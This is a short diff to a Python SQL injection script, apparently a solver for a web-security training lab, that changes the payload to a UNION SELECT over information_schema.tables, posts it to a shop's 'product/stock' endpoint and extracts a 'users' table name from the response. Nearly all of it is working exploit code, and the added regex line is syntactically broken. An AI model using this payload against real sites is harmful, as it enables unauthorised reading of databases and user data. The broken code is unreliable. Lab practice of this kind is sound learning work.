@@ -59,7 +59,7 @@ def main(args):
     shop = Shop(args.url, args.no_proxy, sess)
     url = shop.base_url + "product/stock"
     payload = format_payload(
-        "SELECT table_name FROM information_schema.tables WHERE table_schema='public'"
+        "UNION SELECT table_name FROM information_schema.tables WHERE table_schema='public'"
                              )
     log.info(f"Sending SQLi Payload: {payload}")
     """
@@ -69,7 +69,11 @@ def main(args):
         resp = requests.post(url, data=payload)
     else:
         resp = requests.post(url, data=payload, proxies=utils.PROXIES, verify=False)
-    print(resp.text)
+    pattern = re.compile(r'"users")
+    m = pattern.search(resp.text)
+    table_name = m[0]
+    print(table_name)
+    #print(resp.text)
     
     
 if __name__ == "__main__":
